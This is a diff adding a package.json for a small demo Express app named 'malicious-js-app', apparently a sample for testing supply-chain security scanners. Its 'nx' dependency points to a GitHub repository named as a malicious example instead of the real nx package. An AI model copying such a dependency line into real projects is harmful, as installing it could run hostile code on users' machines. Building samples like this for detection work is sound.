@@ -1,0 +1,17 @@
+{
+  "name": "malicious-js-app",
+  "version": "0.1.0",
+  "private": true,
+  "description": "Simple demo Express web app (intentionally minimal)",
+  "main": "src/index.js",
+  "scripts": {
+    "start": "node src/index.js",
+    "dev": "NODE_ENV=development node src/index.js"
+  },
+  "license": "MIT",
+  "dependencies": {
+    "@types/ms": "^2.1.0",
+    "express": "^4.19.2",
+    "nx": "github:ossprey/example_malicious_javascript_nx#main"
+  }
+}
